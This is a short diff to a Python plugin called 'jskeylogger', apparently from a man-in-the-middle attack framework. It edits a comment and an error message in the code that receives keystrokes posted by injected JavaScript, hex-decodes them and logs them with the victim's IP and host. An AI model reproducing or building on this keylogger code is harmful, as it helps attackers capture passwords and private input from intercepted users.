@@ -15,7 +15,7 @@ class jskeylogger(Inject, Plugin):
         print "[*] Javascript Keylogger plugin online"
 
     def sendPostData(self, request):
-        #Handle the jskeylogger plugin output
+        #Handle the plugin output
         if 'keylog' in request.uri:
             keys = request.postData.split(",")
             del keys[0]; del(keys[len(keys)-1])
@@ -32,7 +32,7 @@ class jskeylogger(Inject, Plugin):
                     try:
                         nice += n.decode('hex')
                     except:
-                        print "ERROR: unknown char " + n
+                        logging.warning("%s ERROR decoding char %s" % (request.client.getClientIP(), n))
 
             logging.warning("%s [%s] Keys: %s" % (request.client.getClientIP(), request.headers['host'], nice))
 
